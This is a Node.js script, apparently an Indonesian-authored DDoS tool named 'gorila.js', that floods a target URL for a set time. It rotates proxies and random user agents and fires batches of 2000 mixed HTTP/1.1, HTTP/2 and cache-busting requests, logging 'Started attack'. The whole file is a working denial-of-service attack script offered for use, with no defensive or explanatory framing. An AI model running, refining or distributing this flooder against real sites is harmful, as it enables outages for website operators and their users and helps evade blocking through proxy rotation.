const fs = require('fs');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const { randomUUID, createHash } = require('crypto');
const { URL } = require('url');

if (process.argv.length < 4) {
    console.log("Usage: node gorila.js <url> <time>");
    process.exit(1);
}

const target = process.argv[2];
const duration = parseInt(process.argv[3]) * 1000;
const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);

let proxyIndex = 0;

function getNextProxy() {
    const proxy = proxies[proxyIndex];
    proxyIndex = (proxyIndex + 1) % proxies.length;
    return proxy.split(':');
}

function getRandomUserAgent() {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function sendHttpRequest(proxyHost, proxyPort, url) {
    const userAgent = getRandomUserAgent();
    const parsedUrl = new URL(url);

    const options = {
        hostname: proxyHost,
        port: proxyPort,
        method: 'GET',
        path: parsedUrl.pathname,
        headers: {
            'User-Agent': userAgent,
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Referer': url,
        },
    };

    const req = (parsedUrl.protocol === 'https:' ? https : http).request(options, (res) => {
        res.on('data', () => {});
        res.on('end', () => {});
    });

    req.on('error', () => {});
    req.end();
}

function sendHttp2Request(url) {
    const userAgent = getRandomUserAgent();
    const client = http2.connect(url);

    client.request({
        ':method': 'GET',
        ':path': '/',
        'User-Agent': userAgent,
        'Accept': '*/*',
        'Cache-Control': 'no-cache',
    }).on('response', () => {}).on('error', () => {
        client.close();
    }).end();
}

function sendHashedRequest(proxyHost, proxyPort, url) {
    const randomHash = createHash('md5').update(randomUUID()).digest('hex');
    const userAgent = getRandomUserAgent();

    const parsedUrl = new URL(url + '?' + randomHash);
    const options = {
        hostname: proxyHost,
        port: proxyPort,
        method: 'GET',
        path: parsedUrl.pathname + parsedUrl.search,
        headers: {
            'User-Agent': userAgent,
            'Accept': '*/*',
        },
    };

    const req = (parsedUrl.protocol === 'https:' ? https : http).request(options, (res) => {
        res.on('data', () => {});
        res.on('end', () => {});
    });

    req.on('error', () => {});
    req.end();
}

function flood() {
    const startTime = Date.now();
    const maxConcurrentRequests = 2000;
    const interval = 1000 / maxConcurrentRequests;

    const sendBatch = () => {
        for (let i = 0; i < maxConcurrentRequests; i++) {
            const [proxyHost, proxyPort] = getNextProxy();
            const requestType = Math.floor(Math.random() * 3);
            if (requestType === 0) sendHttpRequest(proxyHost, proxyPort, target);
            else if (requestType === 1) sendHttp2Request(target);
            else sendHashedRequest(proxyHost, proxyPort, target);
        }
    };

    const intervalId = setInterval(() => {
        sendBatch();

        if (Date.now() - startTime > duration) {
            clearInterval(intervalId);
            console.log("[INFO] Flood selesai!");
        }
    }, interval);
}

console.log("[INFO] Started attack...");
flood();
